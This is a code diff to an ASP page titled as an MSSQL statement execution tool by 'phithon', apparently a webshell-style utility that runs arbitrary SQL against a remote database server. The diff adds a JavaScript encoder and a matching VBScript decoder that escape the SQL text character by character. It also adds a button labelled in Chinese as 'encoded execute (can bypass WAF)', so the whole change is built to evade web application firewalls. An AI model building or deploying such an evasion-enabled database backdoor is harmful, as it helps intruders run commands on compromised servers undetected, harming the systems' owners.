@@ -18,6 +18,17 @@ If Sql_linkport="" Then Sql_linkport="1433"
 
 If Sql_serverip<>"" and Sql_linkport<>"" and Sql_username<>"" and Sql_password<>"" and Sql_content<>"" Then
 
+	dim sqlarr
+	sqlarr = Split(Sql_content, "\")
+	Sql_content = ""
+	for each x in sqlarr
+		if IsNumeric(x) then
+		Sql_content = Sql_content & chr(cint(x))
+		else
+		Sql_content = Sql_content & x
+		end if
+	next
+
 	Response.Write "<hr width='100%'><b>执行结果：</b><hr width='100%'>"
 	Dim SQL,conn,linkStr
 	SQL=Sql_content
@@ -114,12 +125,26 @@ End Sub
 <meta http-equiv="expires" content="Wed, 26 Feb 2006 00:00:00 GMT">
 <% showcss() %>
 <title>MSSQL语句执行工具asp版 by phithon</title>
+<script>
+function encode(s){
+	var r = "";
+	for(var i = 0; i < s.length ; i++){
+		var a = s.charCodeAt(i);
+		if(a < 128 && a > 0){
+			r += "\\" + a;
+		}else{
+			r += "\\" + s[i];
+		}
+	}
+	return r;
+}
+</script>
 </head>
 <body>
 
 <hr width="100%">
 
-<form method="post" action="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec" target="ResultFrame">
+<form method="post" action="<%=Request.ServerVariables("SCRIPT_NAME")%>?do=exec" target="ResultFrame" id="submitf">
 	<table class="gridtable" width="100%" style="FILTER: progid:DXImageTransform.Microsoft.Shadow(color:#f6ae56,direction:145,strength:15);">
 		<tr>
 		<td colspan="2" align="center">
@@ -152,9 +177,10 @@ End Sub
 			scrollbar-track-color: #D8BFD8;
 			scrollbar-arrow-color: #E6E6FA;
 			'>
-			<textarea name="Sql_content" style='width:100%;height:100%;'>输入你要执行的sql语句</textarea>
+			<textarea name="Sql_content" id="sqlc" style='width:100%;height:100%;'>输入你要执行的sql语句</textarea>
 			</DIV>
-			<input type="submit" value="执行命令">
+			<input type="submit" value="普通执行(可能被WAF拦截)">
+			<input type="button" onclick="var a = sqlc.value;sqlc.value=encode(a);submitf.submit();sqlc.value = a;" value="编码执行(可绕过WAF)">
 		</td>
 		</tr>
 	</table>
